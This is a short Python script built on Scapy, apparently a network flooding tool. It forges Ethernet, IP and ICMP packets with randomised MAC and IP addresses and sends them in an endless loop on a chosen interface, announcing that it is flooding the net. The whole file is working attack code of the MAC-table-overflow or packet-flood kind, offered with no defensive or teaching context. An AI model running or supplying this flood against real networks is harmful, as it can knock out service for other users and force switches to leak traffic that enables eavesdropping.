import sys
from scapy.all import *

# Create a packet with random source and destination MAC addresses, and random source and destination IP addresses
packet = Ether(src=RandMAC(), dst=RandMAC()) / \
         IP(src=RandIP(), dst=RandIP()) / \
         ICMP()

# Check if a network interface argument is provided
if len(sys.argv) < 2:
    dev = " "  # Default network interface
else:
    dev = sys.argv[1]  # Use the provided network interface

# Print a message indicating flooding activity
print("Flooding net with random packets on dev " + dev)

# Send the generated packet on the specified network interface in a loop
sendp(packet, iface=dev, loop=1)
